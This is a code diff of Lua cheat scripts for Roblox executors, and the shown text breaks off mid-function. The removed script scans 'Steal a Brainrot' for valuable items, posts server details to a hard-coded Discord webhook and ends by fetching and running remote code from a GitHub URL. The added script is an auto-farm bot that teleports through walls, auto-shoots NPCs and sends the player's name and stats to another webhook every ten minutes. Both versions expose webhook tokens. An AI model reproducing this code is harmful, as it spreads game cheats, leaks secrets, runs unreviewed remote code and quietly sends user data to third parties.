@@ -1,594 +1,399 @@
--- 🎯 BRAINROT INCOME SCANNER v2.0 (ИНДИВИДУАЛЬНЫЕ ПОРОГИ)
--- Сканирует все объекты в Steal a Brainrot и отправляет уведомления в Discord
--- Запуск: автоматически при старте + по клавише F
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local Workspace = game:GetService("Workspace")
+local PathfindingService = game:GetService("PathfindingService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TeleportService = game:GetService("TeleportService")
+local HttpService = game:GetService("HttpService")
+local LocalPlayer = Players.LocalPlayer
 
-local Players = game:GetService('Players')
-local UserInputService = game:GetService('UserInputService')
-local HttpService = game:GetService('HttpService')
+getgenv().WebhookURL = "https://discord.com/api/webhooks/1461362837904429188/IPZwXAQc_zO5MJ6AGAq25wOyEjs41956LuoPEGOusq_7IdKH8dgWQ4SKqqdz0s3RqG85" 
 
--- ⚙️ НАСТРОЙКИ
-local DEFAULT_THRESHOLD = 50_000_000 -- Порог по умолчанию
-local DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1422238166630400044/3ueuPIMI-MIwesyQvnBVd-3d60iBNk3ZCVCGB4Topy90rNEQ7zgtVGHirj-03PUcSU7b'
+local rs_events = ReplicatedStorage:WaitForChild("Events")
+local playgame_remote = rs_events:FindFirstChild("playgame")
+local quest_remote = rs_events:FindFirstChild("Quest")
+local takestam_remote = rs_events:FindFirstChild("takestam")
+local shop_remote = rs_events:FindFirstChild("Shop")
+local tools_remote = rs_events:FindFirstChild("Tools")
 
-print('🎯 Brainrot Scanner v2.0 | JobId:', game.JobId)
+local function check_sea()
+    if game.GameId == 648454481 and playgame_remote then
+        playgame_remote:FireServer("Main Game")
+    end
+end
 
--- 🎮 ОБЪЕКТЫ С ЭМОДЗИ И ИНДИВИДУАЛЬНЫМИ ПОРОГАМИ
-local OBJECTS = {
-    ['Garama and Madundung'] = { emoji = '🍝', threshold = 0 },
-    ['Dragon Cannelloni'] = { emoji = '🐲', threshold = 0 },
-    ['Nuclearo Dinossauro'] = { emoji = '🦕', threshold = 240000000 },
-    ['Esok Sekolah'] = { emoji = '🏠', threshold = 400000000 },
-    ['La Supreme Combinasion'] = { emoji = '🔫', threshold = 0 },
-    ['Ketupat Kepat'] = { emoji = '🍏', threshold = 180000000 },
-    ['Strawberry Elephant'] = { emoji = '🐘', threshold = 0 },
-    ['Spaghetti Tualetti'] = { emoji = '🚽', threshold = 500000000 },
-    ['Ketchuru and Musturu'] = { emoji = '🍾', threshold = 63000000 },
-    ['Tralaledon'] = { emoji = '🦈', threshold = 0 },
-    ['Tictac Sahur'] = { emoji = '🕰️', threshold = 150000000 },
-    ['Los Primos'] = { emoji = '🙆‍♂️', threshold = 0 },
-    ['Tang Tang Keletang'] = { emoji = '📢', threshold = 300000000 },
-    ['Money Money Puggy'] = { emoji = '🐶', threshold = 300000000 },
-    ['Burguro And Fryuro'] = { emoji = '🍔', threshold = 0 },
-    ['Chillin Chili'] = { emoji = '🌶', threshold = 200000000 },
-    ['La Secret Combinasion'] = { emoji = '❓', threshold = 187500000 },
-    ['Eviledon'] = { emoji = '👹', threshold = 300000000 },
-    ['Spooky and Pumpky'] = { emoji = '🎃', threshold = 0 },
-    ['La Spooky Grande'] = { emoji = '👻', threshold = 500000000 },
-    ['Meowl'] = { emoji = '🐈', threshold = 0 },
-    ['Chipso and Queso'] = { emoji = '🧀', threshold = 250000000 },
-    ['La Casa Boo'] = { emoji = '👁‍🗨', threshold = 0 },
-    ['Headless Horseman'] = { emoji = '🐴', threshold = 0 },
-    ['Los Tacoritas'] = { emoji = '🚴', threshold = 999999999 },
-    ['Capitano Moby'] = { emoji = '🚢', threshold = 0 },
-    ['La Taco Combinasion'] = { emoji = '👒', threshold = 400000000 },
-    ['Cooki and Milki'] = { emoji = '🍪', threshold = 0 },
-    ['Los Puggies'] = { emoji = '🦮', threshold = 305000000 },
-    ['Orcaledon'] = { emoji = '🐡', threshold = 240000000 },
-    ['Fragrama and Chocrama'] = { emoji = '🍦', threshold = 0 },
-    ['Guest 666'] = { emoji = '㊙️', threshold = 66000000 },
-    ['Los Bros'] = { emoji = '📱', threshold = 300000000 },
-    ['Lavadorito Spinito'] = { emoji = '📺', threshold = 250000000 },
-    ['W or L'] = { emoji = '🪜', threshold = 300000000 },
-    ['Fishino Clownino'] = { emoji = '🤡', threshold = 0 },
-    ['Mieteteira Bicicleteira'] = { emoji = '💄', threshold = 400000000 },
-    ['La Extinct Grande'] = { emoji = '☠️', threshold = 370000000 },
-    ['Los Chicleteiras'] = { emoji = '🍼', threshold = 999999999 },
-    ['Las Sis'] = { emoji = '☕️', threshold = 350000000 },
-    ['Tacorita Bicicleta'] = { emoji = '🌮', threshold = 100000000 },
-    ['Los Mobilis'] = { emoji = '📱', threshold = 400000000 },
-    ['La Ginger Sekolah'] = { emoji = '🎄', threshold = 400000000 },
-    ['La Jolly Grande'] = { emoji = '☃️', threshold = 400000000 },
-    ['Swaggy Bros'] = { emoji = '🍹', threshold = 400000000 },
-    ['Los Burritos'] = { emoji = '🌯', threshold = 250000000 },
-    ['Reinito Sleighito'] = { emoji = '🦌', threshold = 0 },
-    ['Dragon Gingerini'] = { emoji = '🫚', threshold = 0 },
-    ['Ginger Gerat'] = { emoji = '🌑', threshold = 10000000 },
-    ['Jolly Jolly Sahur'] = { emoji = '🏴‍☠️', threshold = 100000000 },
-    ['Money Money Reinted'] = { emoji = '🫰', threshold = 250000000 },
-    ['Skibidi Toilet'] = { emoji = '🪠', threshold = 0 },
+check_sea()
+
+getgenv().pathfindToken = 0
+getgenv().StopShootingForQuest = false 
+getgenv().FishmanKills = 0
+
+local settings = {
+    Step = 1.3,
+    FallSpeed = 2,
+    HipHeight = 3.5,
+    WallTPHeight = 100,
+    WallCheckRange = 4.8,
+    RiflePrice = 300,
 }
 
--- 💰 ПАРСЕР ДОХОДА
-local function parseGenerationText(s)
-    if type(s) ~= 'string' or s == '' then
-        return nil
-    end
-    local norm = s:gsub('%$', ''):gsub(',', ''):gsub('%s+', '')
-    local num, suffix = norm:match('^([%-%d%.]+)([KkMmBb]?)/s$')
-    if not num then
-        return nil
-    end
-    local val = tonumber(num)
-    if not val then
-        return nil
-    end
-    local mult = 1
-    if suffix == 'K' or suffix == 'k' then
-        mult = 1e3
-    elseif suffix == 'M' or suffix == 'm' then
-        mult = 1e6
-    elseif suffix == 'B' or suffix == 'b' then
-        mult = 1e9
-    end
-    return val * mult
+local positions = {
+    rifle_shop = Vector3.new(-532, 6, -3448),
+    quest_npc = Vector3.new(-548, 6, -3403),
+    becky_quest = Vector3.new(7735, -2176, -17223),
+    fishman_farm = Vector3.new(7838.7, -2151.3, -17134.5)
+}
+
+local function GetStatsFolder()
+    return ReplicatedStorage:FindFirstChild("Stats" .. LocalPlayer.Name)
 end
 
-local function formatIncomeNumber(n)
-    if not n then
-        return 'Unknown'
+local function GetPeli()
+    local folder = GetStatsFolder()
+    if folder and folder:FindFirstChild("Stats") then
+        return folder.Stats.Peli.Value
     end
-    if n >= 1e9 then
-        local v = n / 1e9
-        return (v % 1 == 0 and string.format('%dB/s', v) or string.format(
-            '%.1fB/s',
-            v
-        )):gsub('%.0B/s', 'B/s')
-    elseif n >= 1e6 then
-        local v = n / 1e6
-        return (v % 1 == 0 and string.format('%dM/s', v) or string.format(
-            '%.1fM/s',
-            v
-        )):gsub('%.0M/s', 'M/s')
-    elseif n >= 1e3 then
-        local v = n / 1e3
-        return (v % 1 == 0 and string.format('%dK/s', v) or string.format(
-            '%.1fK/s',
-            v
-        )):gsub('%.0K/s', 'K/s')
-    else
-        return string.format('%d/s', n)
+    return 0
+end
+
+local function GetLevel()
+    local folder = GetStatsFolder()
+    if folder and folder:FindFirstChild("Stats") and folder.Stats:FindFirstChild("Level") then
+        return folder.Stats.Level.Value
+    end
+    return 0
+end
+
+local function SendWebhook()
+    local httpRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+    if not httpRequest then return end
+    local historyLvl = nil
+    local historyPeli = nil
+    local firstRun = true
+    while true do
+        local currentLvl = GetLevel()
+        local currentPeli = GetPeli()
+        local payload = {
+            ["username"] = "Onyx Squad [Private]",
+            ["avatar_url"] = "https://cdn.discordapp.com/attachments/1455503437000347713/1461361287882735832/latest.png?ex=696a4641&is=6968f4c1&hm=4c0c1bfc3326f8e6f6f867c45308d645611b8f49526b6cb3f87f0365f90e7a9e&",
+            ["embeds"] = {{
+                ["title"] = "**Onyx Squad have info for you!**",
+                ["description"] = string.format(
+                    "Player: %s\n\nCurrent Lvl: %s\nCurrent Peli: %s\n\nLvl 10 min ago: %s\nPeli 10 min ago: %s",
+                    LocalPlayer.Name,
+                    tostring(currentLvl),
+                    tostring(currentPeli),
+                    tostring(historyLvl or "nil"),
+                    tostring(historyPeli or "nil")
+                ),
+                ["color"] = 0,
+                ["image"] = {
+                    ["url"] = "https://media.discordapp.net/attachments/1455503437000347713/1461359339272147037/image.png?ex=696a4471&is=6968f2f1&hm=1a5fe16b73e7a8f6d830a10f3a704ea21b7240fa929ca23b1a17ebc826a6d350&=&format=webp&quality=lossless"
+                }
+            }}
+        }
+        httpRequest({
+            Url = getgenv().WebhookURL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(payload)
+        })
+        if firstRun then
+            historyLvl = currentLvl
+            historyPeli = currentPeli
+            firstRun = false
+        end
+        task.wait(600)
+        historyLvl = currentLvl
+        historyPeli = currentPeli
+    end
+end
+spawn(SendWebhook)
+
+local function HopServer()
+    local sfUrl = "https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Asc&limit=100"
+    local success, result = pcall(function()
+        return game:HttpGet(string.format(sfUrl, game.PlaceId))
+    end)
+    if success then
+        local servers = HttpService:JSONDecode(result)
+        for _, s in pairs(servers.data) do
+            if s.playing < s.maxPlayers and s.id ~= game.JobId then
+                TeleportService:TeleportToPlaceInstance(game.PlaceId, s.id, LocalPlayer)
+                return
+            end
+        end
     end
 end
 
--- 📝 ПОЛУЧЕНИЕ ТЕКСТА ИЗ UI
-local function grabText(inst)
-    if not inst then
-        return nil
+local function GetChar()
+    local Char = LocalPlayer.Character
+    if Char then
+        return Char, Char:FindFirstChild("HumanoidRootPart"), Char:FindFirstChild("Humanoid")
     end
-    if
-        inst:IsA('TextLabel')
-        or inst:IsA('TextButton')
-        or inst:IsA('TextBox')
-    then
-        local ok, ct = pcall(function()
-            return inst.ContentText
-        end)
-        if ok and type(ct) == 'string' and #ct > 0 then
-            return ct
+    return nil, nil, nil
+end
+
+local function HasRifle()
+    return LocalPlayer.Backpack:FindFirstChild("Rifle") or (LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("Rifle"))
+end
+
+local function GetIslandData(islandName)
+    local island = Workspace.Islands:FindFirstChild(islandName)
+    if island then
+        local cf, size = island:GetBoundingBox()
+        return cf, size
+    end
+    return nil, nil
+end
+
+local function IsPositionOnIsland(pos, islandName)
+    local cf, size = GetIslandData(islandName)
+    if not cf then return false end
+    local localPos = cf:PointToObjectSpace(pos)
+    return math.abs(localPos.X) <= size.X/2 and math.abs(localPos.Z) <= size.Z/2
+end
+
+local function FireDash()
+    if takestam_remote then
+        takestam_remote:FireServer(0.56, "dash")
+    end
+end
+
+local function TweenMove(targetPos)
+    local char, rootPart, _ = GetChar()
+    if not rootPart then return end
+    local myToken = getgenv().pathfindToken
+    local lastWallTP = 0
+    local rayParams = RaycastParams.new()
+    rayParams.FilterType = Enum.RaycastFilterType.Exclude
+    rayParams.FilterDescendantsInstances = {char}
+    rayParams.IgnoreWater = true
+    while (rootPart.Position - targetPos).Magnitude > 4 and myToken == getgenv().pathfindToken do
+        local currentPos = rootPart.Position
+        local delta = targetPos - currentPos
+        local dirXZ = Vector3.new(delta.X, 0, delta.Z).Unit
+        local nextXZ = currentPos + dirXZ * settings.Step
+        local wallResult = Workspace:Raycast(currentPos, dirXZ * settings.WallCheckRange, rayParams)
+        if wallResult and wallResult.Instance.CanCollide and (tick() - lastWallTP > 0.3) then
+            lastWallTP = tick()
+            FireDash()
+            local forwardPos = wallResult.Position + (dirXZ * 2)
+            local topCheck = Workspace:Raycast(forwardPos + Vector3.new(0, settings.WallTPHeight, 0), Vector3.new(0, -settings.WallTPHeight * 2, 0), rayParams)
+            local jumpY = topCheck and (topCheck.Position.Y + settings.HipHeight) or (currentPos.Y + 15)
+            rootPart.CFrame = CFrame.new(forwardPos.X, jumpY, forwardPos.Z)
+            task.wait(0.05)
+        else
+            local groundRay = Workspace:Raycast(nextXZ + Vector3.new(0, 15, 0), Vector3.new(0, -50, 0), rayParams)
+            local finalY = groundRay and (groundRay.Position.Y + settings.HipHeight) or (currentPos.Y - settings.FallSpeed)
+            if targetPos.Y > -1000 then
+                finalY = math.max(finalY, 2)
+            end
+            rootPart.CFrame = CFrame.new(nextXZ.X, finalY, nextXZ.Z)
         end
-        local t = inst.Text
-        if type(t) == 'string' and #t > 0 then
-            return t
+        RunService.Heartbeat:Wait()
+    end
+end
+
+local function PathfindTo(target)
+    getgenv().pathfindToken = getgenv().pathfindToken + 1
+    local targetPos = typeof(target) == "Vector3" and target or (typeof(target) == "CFrame" and target.Position or target.Position)
+    print("Moving to:", targetPos)
+    TweenMove(targetPos)
+end
+
+local function do_chest_farm()
+    local nearest_prompt = nil
+    local min_dist = math.huge
+    local _, root = GetChar()
+    if not root then return false end
+    if not Workspace:FindFirstChild("Env") then return false end
+    for _, part in ipairs(Workspace.Env:GetChildren()) do
+        if part:IsA("BasePart") and IsPositionOnIsland(part.Position, "Town of Beginnings") then
+            local prompt = part:FindFirstChildOfClass("ProximityPrompt")
+            if prompt then
+                local dist = (root.Position - part.Position).Magnitude
+                if dist < min_dist then
+                    min_dist = dist
+                    nearest_prompt = prompt
+                end
+            end
         end
     end
-    if inst:IsA('StringValue') then
-        local v = inst.Value
-        if type(v) == 'string' and #v > 0 then
-            return v
+    if nearest_prompt then
+        print("Chest found! Collecting...")
+        PathfindTo(nearest_prompt.Parent.Position + Vector3.new(0, 2, 0))
+        fireproximityprompt(nearest_prompt)
+        task.wait(0.5)
+        return true
+    end
+    return false
+end
+
+local function GetGunObject(tool)
+    for _, connection in pairs(getconnections(tool.Equipped)) do
+        local func = connection.Function
+        if func then
+            local upvalues = debug.getupvalues(func)
+            for _, val in pairs(upvalues) do
+                if type(val) == "table" and val["Reloaded"] ~= nil then return val end
+            end
         end
     end
     return nil
 end
 
-local function getOverheadInfo(animalOverhead)
-    if not animalOverhead then
-        return nil, nil
-    end
-
-    local name = nil
-    local display = animalOverhead:FindFirstChild('DisplayName')
-    if display then
-        name = grabText(display)
-    end
-
-    if not name then
-        local anyText = animalOverhead:FindFirstChildOfClass('TextLabel')
-            or animalOverhead:FindFirstChildOfClass('TextButton')
-            or animalOverhead:FindFirstChildOfClass('TextBox')
-        name = anyText and grabText(anyText) or nil
-    end
-
-    local genText = nil
-    local generation = animalOverhead:FindFirstChild('Generation')
-    if generation then
-        genText = grabText(generation)
-    end
-
-    if not genText then
-        for _, child in ipairs(animalOverhead:GetDescendants()) do
-            if
-                child:IsA('TextLabel')
-                or child:IsA('TextButton')
-                or child:IsA('TextBox')
-            then
-                local text = grabText(child)
-                if text and (text:match('%$') or text:match('/s')) then
-                    genText = text
-                    break
-                end
-            end
+local function GetLivingFishman()
+    if not Workspace:FindFirstChild("NPCs") then return nil end
+    for _, npc in ipairs(Workspace.NPCs:GetChildren()) do
+        if npc.Name == "Fishman Karate User" and npc:FindFirstChild("Humanoid") and npc.Humanoid.Health > 0 and npc:FindFirstChild("Head") then
+            return npc
         end
     end
-
-    return name, genText
+    return nil
 end
 
-local function isGuidName(s)
-    return s:match('^[0-9a-fA-F]+%-%x+%-%x+%-%x+%-%x+$') ~= nil
-end
-
--- 🔍 ФУНКЦИЯ ПОИСКА ПРИБЫЛИ В DEBRIS FOLDER
-local function scanDebrisForIncome()
-    local DebrisFolder = workspace:FindFirstChild("Debris")
-    if not DebrisFolder then 
-        print("⚠️ Папка Debris не найдена")
-        return {} 
-    end
-
-    local results = {}
-
-    for _, inst in ipairs(DebrisFolder:GetDescendants()) do
-        if inst.Name == "FastOverheadTemplate" then
-            local gui = inst:FindFirstChild("GUI")
-            local name = gui and grabText(gui:FindFirstChild("DisplayName")) or nil
-            local genInst = gui and gui:FindFirstChild("Generation")
-            local genText = genInst and grabText(genInst) or nil
-            local genNum = genText and parseGenerationText(genText) or nil
-
-            if name and genNum then
-                table.insert(results, { name = name, genText = genText, gen = genNum, location = "Debris" })
-            end
+local function StartShooting()
+    print("Initializing Combat Logic...")
+    local tool = LocalPlayer.Backpack:FindFirstChild("Rifle") or LocalPlayer.Character:FindFirstChild("Rifle")
+    if tool then
+        if not LocalPlayer.Character:FindFirstChild("Rifle") then
+            LocalPlayer.Character.Humanoid:EquipTool(tool)
         end
-    end
-
-    -- Сортировка по доходу (убывание)
-    table.sort(results, function(a, b) return a.gen > b.gen end)
-
-    -- Вывод в консоль
-    if #results > 0 then
-        print("\n📊 НАЙДЕНО В DEBRIS FOLDER:")
-        for _, r in ipairs(results) do
-            print(string.format("   %s - %s (%.0f/s)", r.name, r.genText, r.gen))
-        end
-    else
-        print("📭 В Debris folder объектов не найдено")
-    end
-
-    return results
-end
-
--- 🔍 ПОЛНЫЕ СКАНЕРЫ
-local function scanPlots()
-    local results = {}
-    local Plots = workspace:FindFirstChild('Plots')
-    if not Plots then
-        return results
-    end
-
-    for _, plot in ipairs(Plots:GetChildren()) do
-        local Podiums = plot:FindFirstChild('AnimalPodiums')
-        if Podiums then
-            for _, podium in ipairs(Podiums:GetChildren()) do
-                local Base = podium:FindFirstChild('Base')
-                local Spawn = Base and Base:FindFirstChild('Spawn')
-                local Attachment = Spawn and Spawn:FindFirstChild('Attachment')
-                local Overhead = Attachment
-                    and Attachment:FindFirstChild('AnimalOverhead')
-                if Overhead then
-                    local name, genText = getOverheadInfo(Overhead)
-                    local genNum = genText and parseGenerationText(genText)
-                        or nil
-                    if name and genNum then
-                        table.insert(
-                            results,
-                            { name = name, gen = genNum, location = 'Plot' }
-                        )
+        local GunObject = GetGunObject(tool)
+        local GunHandle = require(ReplicatedStorage.Modules.GunHandle)
+        if GunObject then
+            spawn(function()
+                while task.wait() do
+                    if getgenv().StopShootingForQuest then 
+                        task.wait(0.5)
+                        continue 
+                    end
+                    local targetNPC = GetLivingFishman()
+                    if targetNPC then
+                        while targetNPC and targetNPC.Parent and targetNPC:FindFirstChild("Humanoid") and targetNPC.Humanoid.Health > 0 do
+                            if getgenv().StopShootingForQuest then break end
+                            if not GunObject.Reloaded then
+                                GunHandle.Reload(GunObject)
+                            else
+                                local playerModels = Workspace:FindFirstChild("PlayerCharacters")
+                                local myCharModel = playerModels and playerModels:FindFirstChild(LocalPlayer.Name)
+                                local gunPart = myCharModel and myCharModel:FindFirstChild("RifleGun")
+                                if gunPart and gunPart:FindFirstChild("Hole") and targetNPC:FindFirstChild("Head") then
+                                    local args = {"fire", {
+                                        Start = gunPart.Hole.CFrame,
+                                        Gun = "Rifle",
+                                        joe = "true",
+                                        Position = targetNPC.Head.Position
+                                    }}
+                                    ReplicatedStorage.Events.CIcklcon:FireServer(unpack(args))
+                                    GunObject.Reloaded = false
+                                end
+                            end
+                            task.wait() 
+                        end
+                        if targetNPC and targetNPC:FindFirstChild("Humanoid") and targetNPC.Humanoid.Health <= 0 then
+                            getgenv().FishmanKills = getgenv().FishmanKills + 1
+                            print("Kills: " .. getgenv().FishmanKills .. "/5")
+                        end
                     end
                 end
-            end
-        end
-    end
-    return results
-end
-
-local function scanRunway()
-    local results = {}
-    for _, obj in ipairs(workspace:GetChildren()) do
-        if isGuidName(obj.Name) then
-            local part = obj:FindFirstChild('Part')
-            local info = part and part:FindFirstChild('Info')
-            local overhead = info and info:FindFirstChild('AnimalOverhead')
-            if overhead then
-                local name, genText = getOverheadInfo(overhead)
-                local genNum = genText and parseGenerationText(genText) or nil
-                if name and genNum then
-                    table.insert(
-                        results,
-                        { name = name, gen = genNum, location = 'Runway' }
-                    )
-                end
-            end
-        end
-    end
-    return results
-end
-
-local function scanAllOverheads()
-    local results, processed = {}, {}
-    local function recursiveSearch(parent)
-        for _, child in ipairs(parent:GetChildren()) do
-            if child.Name == 'AnimalOverhead' and not processed[child] then
-                processed[child] = true
-                local name, genText = getOverheadInfo(child)
-                local genNum = genText and parseGenerationText(genText) or nil
-                if name and genNum then
-                    table.insert(
-                        results,
-                        { name = name, gen = genNum, location = 'World' }
-                    )
-                end
-            end
-            pcall(function()
-                recursiveSearch(child)
             end)
         end
     end
-    recursiveSearch(workspace)
-    return results
 end
 
-local function scanPlayerGui()
-    local results = {}
-    local lp = Players.LocalPlayer
-    if not lp then
-        return results
-    end
+print("Script starting...")
+for _, v in next, getconnections(LocalPlayer.Idled) do v:Disable() end
+if playgame_remote then playgame_remote:FireServer("Main Game") end
 
-    local playerGui = lp:FindFirstChild('PlayerGui')
-    if not playerGui then
-        return results
-    end
-
-    local function searchInGui(parent)
-        for _, child in ipairs(parent:GetChildren()) do
-            if child.Name == 'AnimalOverhead' or child.Name:match('Animal') then
-                local name, genText = getOverheadInfo(child)
-                local genNum = genText and parseGenerationText(genText) or nil
-                if name and genNum then
-                    table.insert(
-                        results,
-                        { name = name, gen = genNum, location = 'GUI' }
-                    )
-                end
-            end
-            pcall(function()
-                searchInGui(child)
-            end)
+spawn(function()
+    while task.wait(2) do
+        local stats = GetStatsFolder()
+        if stats and stats.Stats.SkillPoints.Value > 0 then
+            ReplicatedStorage.Events.stats:FireServer("GunMastery", nil, 1)
         end
-    end
-    searchInGui(playerGui)
-    return results
-end
-
--- 📊 ГЛАВНАЯ ФУНКЦИЯ СБОРА
-local function collectAll(timeoutSec)
-    local t0 = os.clock()
-    local collected = {}
-
-    repeat
-        collected = {}
-
-        local allSources = {
-            scanPlots(),
-            scanRunway(),
-            scanAllOverheads(),
-            scanPlayerGui(),
-            scanDebrisForIncome(), -- Добавлен сканирование Debris
-        }
-
-        for _, source in ipairs(allSources) do
-            for _, item in ipairs(source) do
-                table.insert(collected, item)
-            end
-        end
-
-        local seen, unique = {}, {}
-        for _, item in ipairs(collected) do
-            local key = item.name .. ':' .. tostring(item.gen)
-            if not seen[key] then
-                seen[key] = true
-                table.insert(unique, item)
-            end
-        end
-        collected = unique
-
-        if #collected > 0 then
-            break
-        end
-        task.wait(0.5)
-    until os.clock() - t0 > timeoutSec
-
-    return collected
-end
-
--- 📤 DISCORD УВЕДОМЛЕНИЯ
-local function getRequester()
-    return http_request
-        or request
-        or (syn and syn.request)
-        or (fluxus and fluxus.request)
-        or (KRNL_HTTP and KRNL_HTTP.request)
-end
-
-local function sendDiscordNotification(filteredObjects)
-    local req = getRequester()
-    if not req then
-        warn('❌ Нет HTTP API в executor')
-        return
-    end
-
-    local jobId = game.JobId
-    local placeId = game.PlaceId
-
-    if #filteredObjects == 0 then
-        print('🔍 Объектов выше порога не найдено')
-        return
-    end
-
-    -- Сортируем по доходу (убывание)
-    table.sort(filteredObjects, function(a, b)
-        return a.gen > b.gen
-    end)
-
-    -- Формируем список объектов (без слова "порог" и без локаций World/Debris)
-    local objectsList = {}
-    for i = 1, math.min(15, #filteredObjects) do
-        local obj = filteredObjects[i]
-        local cfg = OBJECTS[obj.name] or {}
-        local emoji = cfg.emoji or '💰'
-        
-        -- Исключаем локации "World" и "Debris"
-        local locationText = ""
-        if obj.location and obj.location ~= "World" and obj.location ~= "Debris" then
-            locationText = " | " .. obj.location
-        end
-        
-        table.insert(
-            objectsList,
-            string.format(
-                '%s **%s** (%s)%s',
-                emoji,
-                obj.name,
-                formatIncomeNumber(obj.gen),
-                locationText
-            )
-        )
-    end
-    local objectsText = table.concat(objectsList, '\n')
-
-    -- Телепорт команда в отдельном блоке для копирования
-   local teleportText = string.format("```lua\nlocal ts = game:GetService('TeleportService'); ts:TeleportToPlaceInstance(%d, '%s')\n```", game.PlaceId, game.JobId)
-
-    local payload = {
-        username = '🎯 Brainrot Scanner',
-        embeds = {
-            {
-                title = '💎 Найдены объекты!',
-                color = 0x2f3136,
-                fields = {
-                    {
-                        name = '🆔 Сервер (Job ID)',
-                        value = string.format('```%s```', jobId),
-                        inline = false,
-                    },
-                    {
-                        name = '💰 Объекты:',
-                        value = objectsText,
-                        inline = false,
-                    },
-                    {
-                        name = '🚀 Телепорт (нажмите 📋 чтобы скопировать):',
-                        value = teleportText,
-                        inline = false,
-                    },
-                },
-                footer = {
-                    text = string.format(
-                        'Найдено: %d объектов • %s',
-                        #filteredObjects,
-                        os.date('%H:%M:%S')
-                    ),
-                },
-                timestamp = DateTime.now():ToIsoDate(),
-            },
-        },
-    }
-
-    print('📤 Отправляю уведомление с', #filteredObjects, 'объектами')
-
-    local ok, res = pcall(function()
-        return req({
-            Url = DISCORD_WEBHOOK_URL,
-            Method = 'POST',
-            Headers = { ['Content-Type'] = 'application/json' },
-            Body = HttpService:JSONEncode(payload),
-        })
-    end)
-
-    if ok then
-        print('✅ Уведомление отправлено в Discord!')
-    else
-        warn('❌ Ошибка отправки:', res)
-    end
-end
-
--- 🎮 ГЛАВНАЯ ФУНКЦИЯ
-local function scanAndNotify()
-    print('🔍 Сканирую все объекты...')
-    
-    -- Сначала сканируем Debris отдельно для вывода в консоль
-    scanDebrisForIncome()
-    
-    -- Затем собираем все объекты
-    local allFound = collectAll(8.0)
-
-    -- Фильтрация по индивидуальным порогам
-    local filtered = {}
-    for _, obj in ipairs(allFound) do
-        local cfg = OBJECTS[obj.name]
-        if cfg and obj.gen then
-            local threshold = cfg.threshold or DEFAULT_THRESHOLD
-            if obj.gen >= threshold then
-                table.insert(filtered, obj)
-            end
-        end
-    end
-
-    -- Вывод в консоль
-    print('\n📊 ОБЩИЙ ОТЧЕТ:')
-    print('Найдено всего объектов:', #allFound)
-    print('Выше порога:', #filtered)
-
-    for _, obj in ipairs(filtered) do
-        local cfg = OBJECTS[obj.name] or {}
-        local emoji = cfg.emoji or '💰'
-        local threshold = cfg.threshold or DEFAULT_THRESHOLD
-
-        print(
-            string.format(
-                '%s %s: %s (%s) - порог: %s',
-                emoji,
-                obj.name,
-                formatIncomeNumber(obj.gen),
-                obj.location or 'Unknown',
-                formatIncomeNumber(threshold)
-            )
-        )
-    end
-
-    -- Отправляем уведомление если есть что показать
-    if #filtered > 0 then
-        sendDiscordNotification(filtered)
-    else
-        print('🔍 Нет объектов выше порога')
-    end
-end
-
--- 🚀 ЗАПУСК
-print('🎯 === BRAINROT INCOME SCANNER (ИНДИВИДУАЛЬНЫЕ ПОРОГИ) ===')
-print('💡 Каждый объект имеет свой порог уведомления')
-print('⚙️  Настрой пороги в разделе OBJECTS')
-print('📁 Добавлено сканирование Debris folder')
-
--- Показываем текущие пороги
-print('\n📊 ТЕКУЩИЕ ПОРОГИ:')
-for name, cfg in pairs(OBJECTS) do
-    print(string.format('   %s %s: %s', cfg.emoji, name, formatIncomeNumber(cfg.threshold)))
-end
-print('')
-
-scanAndNotify()
-
--- ⌨️ ПОВТОР ПО КЛАВИШЕ F
-local lastScan, DEBOUNCE = 0, 3
-UserInputService.InputBegan:Connect(function(input, gpe)
-    if gpe then
-        return
-    end
-    if input.KeyCode == Enum.KeyCode.F then
-        local now = os.clock()
-        if now - lastScan < DEBOUNCE then
-            return
-        end
-        lastScan = now
-        print('\n🔄 === ПОВТОРНОЕ СКАНИРОВАНИЕ (F) ===')
-        scanAndNotify()
     end
 end)
 
-print('💡 Нажмите F для повторного сканирования')
-print('📱 Discord webhook готов к отправке уведомлений')
-print('📁 Debris сканирование активно')
+if not HasRifle() then
+    print("Checking Peli for Rifle...")
+    while not HasRifle() do
+        local currentPeli = GetPeli()
+        if currentPeli >= settings.RiflePrice then
+            print("Buying Rifle...")
+            PathfindTo(positions.rifle_shop)
+            shop_remote:InvokeServer(Workspace.BuyableItems.Rifle, 1)
+            task.wait(1)
+            tools_remote:InvokeServer("equip", "Rifle")
+            task.wait(1)
+        else
+            if not do_chest_farm() then
+                HopServer() 
+                task.wait(10)
+            end
+        end
+        task.wait(0.5)
+    end
+end
 
--- Загрузка дополнительного скрипта
-loadstring(game:HttpGet("https://raw.githubusercontent.com/velo35001/logi/refs/heads/main/botik.lua"))()
+print("Rifle Obtained. Proceeding to Fishman Island...")
+local _, hrp = GetChar()
+if not IsPositionOnIsland(hrp.Position, "Fishman Island") then
+    local startPos = Vector3.new(1793.7, 42.7, -12327.4)
+    local underPos = CFrame.new(1793.7, -92.7, -12327.4)
+    PathfindTo(startPos)
+    task.wait(1)
+    FireDash()
+    local _, charRoot = GetChar()
+    if charRoot then charRoot.CFrame = underPos end
+end
+
+spawn(function()
+    local done = false
+    while task.wait(1) do
+        local _, charRoot = GetChar()
+        if charRoot and IsPositionOnIsland(charRoot.Position, "Fishman Island") and not done then
+            done = true
+            print("Confirmed: On Fishman Island.")
+            PathfindTo(Vector3.new(7976.2, -2152.8, -17075.1))
+            task.wait(1)
+            ReplicatedStorage:WaitForChild("Events"):WaitForChild("SetSpawn"):FireServer()
+            task.wait(1)
+            StartShooting()
+            if GetLevel() < 190 then
+                 PathfindTo(positions.fishman_farm)
+            end
+            break
+        end
+    end
+end)
+
+spawn(function()
+    while task.wait(1) do
+        if GetLevel() >= 190 then
+            print("Level 190+ detected. Starting Becky Quest Loop.")
+            getgenv().StopShootingForQuest = true
+            task.wait(0.5)
+            PathfindTo(positions.becky_quest)
+            task.wait(0.5)
+            local args = {{"takequest", "Help becky"}}
+            quest_remote:InvokeServer(unpack(args))
+            print("Quest 'Help becky' taken.")
+            getgenv().FishmanKills = 0
+            task.wait(1)
